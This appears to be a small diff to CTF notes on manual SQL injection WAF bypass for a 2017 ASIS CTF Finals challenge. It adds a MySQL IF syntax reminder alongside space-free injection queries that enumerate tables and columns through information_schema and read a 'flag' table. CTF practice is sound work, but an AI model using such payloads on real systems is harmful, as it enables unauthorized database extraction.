@@ -1,5 +1,8 @@
 Manual SQLi WAF bypass from https://github.com/Voorivex/ctf/tree/master/2017-ASIS-CTF-Finals/GSA%20Main%20Server
 
+MySQL IF statments: IF(expression ,expr_true, expr_false); 
+                    IF(expression , return THIS if true,  return THIS if false);
+
 #q = "(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))"
 #q = "(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag'))"
 q = "(select(flag)from(flag))"
